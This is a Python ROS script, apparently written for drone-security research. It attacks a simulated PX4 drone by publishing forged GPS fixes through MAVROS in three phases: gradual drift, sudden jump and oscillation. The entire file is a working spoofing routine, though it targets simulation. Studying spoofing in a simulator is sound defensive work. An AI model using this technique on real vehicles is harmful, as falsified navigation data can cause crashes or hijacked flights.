#!/usr/bin/env python3
"""
GPS Spoofing Attack Script for PX4 SITL with MAVROS
Implements three attack phases: gradual drift, sudden jump, oscillation
"""
import rospy
from mavros_msgs.msg import HilGPS
import time
import math

class GPSSpoofingAttack:
    def __init__(self):
        rospy.init_node('gps_spoofing_attack', anonymous=True)
        self.gps_pub = rospy.Publisher('/mavros/hil/gps', HilGPS, queue_size=10)
        rospy.loginfo("GPS Spoofing Node Initialized")

    def run_attack(self):
        base_lat = 47.397742  # Zurich latitude
        base_lon = 8.545594   # Zurich longitude
        altitude = 584000     # Altitude in mm (584 m)

        attack_duration = 90  # seconds
        rate = rospy.Rate(10)  # 10 Hz loop

        rospy.loginfo("Starting GPS Spoofing Attack")
        rospy.loginfo("Phases: Gradual Drift -> Sudden Jump -> Oscillation")

        for t in range(attack_duration * 10):  # 10 Hz iterations
            if rospy.is_shutdown():
                break
                
            sec = t / 10.0  # Convert to seconds

            # Attack phase logic
            if sec < 30:
                drift = 0.00001 * sec
                phase = "Gradual Drift"
            elif sec < 60:
                drift = 0.002 + 0.00002 * (sec - 30)
                phase = "Sudden Jump"
            else:
                drift = 0.004 + 0.001 * math.sin((sec - 60) * 0.3)
                phase = "Oscillation"

            spoof_lat = base_lat + drift
            spoof_lon = base_lon + drift

            # Create GPS message
            gps_msg = HilGPS()
            gps_msg.header.stamp = rospy.Time.now()
            gps_msg.fix_type = 3
            gps_msg.lat = int(spoof_lat * 1e7)
            gps_msg.lon = int(spoof_lon * 1e7)
            gps_msg.alt = altitude
            gps_msg.eph = 100
            gps_msg.epv = 100
            gps_msg.vel = 250
            gps_msg.vn = 0
            gps_msg.ve = 0
            gps_msg.vd = 0
            gps_msg.cog = 180
            gps_msg.satellites_visible = 8

            self.gps_pub.publish(gps_msg)

            # Fixed logging without f-string issues
            error_meters = drift * 111000
            rospy.loginfo("Time: %.1fs Phase: %s Error: %.0fm Lat: %.7f Lon: %.7f", 
                         sec, phase, error_meters, spoof_lat, spoof_lon)
            
            rate.sleep()

        rospy.loginfo("GPS Spoofing Attack Completed!")

if __name__ == '__main__':
    try:
        attacker = GPSSpoofingAttack()
        rospy.sleep(2)
        attacker.run_attack()
    except rospy.ROSInterruptException:
        rospy.loginfo("GPS Spoofing Attack Interrupted")

